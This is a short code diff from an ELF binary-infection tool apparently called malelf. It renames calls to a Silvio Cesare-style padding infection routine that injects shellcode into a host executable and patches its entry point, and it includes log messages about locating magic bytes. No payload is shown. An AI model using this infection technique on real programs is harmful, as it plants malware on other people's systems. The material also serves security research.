@@ -213,17 +213,17 @@ _u32 _malelf_infect_cesare(MalelfInfect *obj)
                 MALELF_LOG_SUCCESS("Payload shellcode automatically "
                                    "created, magic bytes at '0x%04x'\n",
                                    magic_offset);
-                result = malelf_infect_silvio_padding32(&input,
-                                                        &output,
-                                                        &malware_ready,
-                                                        0,
-                                                        magic_bytes);
+                result = malelf_infect_silvio_padding(&input,
+                                                      &output,
+                                                      &malware_ready,
+                                                      0,
+                                                      magic_bytes);
         } else if (obj->offset_ret > 0) {
-                result = malelf_infect_silvio_padding32(&input,
-                                                        &output,
-                                                        &malware,
-                                                        obj->offset_ret,
-                                                        0);
+                result = malelf_infect_silvio_padding(&input,
+                                                      &output,
+                                                      &malware,
+                                                      obj->offset_ret,
+                                                      0);
         } else {
                 MALELF_LOG_SUCCESS("Trying to find magic bytes in shellcode "
                                    "to patch with host entry point.\n");
@@ -252,11 +252,11 @@ _u32 _malelf_infect_cesare(MalelfInfect *obj)
 
                 MALELF_LOG_SUCCESS("Found at '0x%04x\n", obj->offset_ret);
 
-                result = malelf_infect_silvio_padding32(&input,
-                                                        &output,
-                                                        &malware,
-                                                        obj->offset_ret,
-                                                        0);
+                result = malelf_infect_silvio_padding(&input,
+                                                      &output,
+                                                      &malware,
+                                                      obj->offset_ret,
+                                                      0);
         }
 
         if (MALELF_SUCCESS != result) {
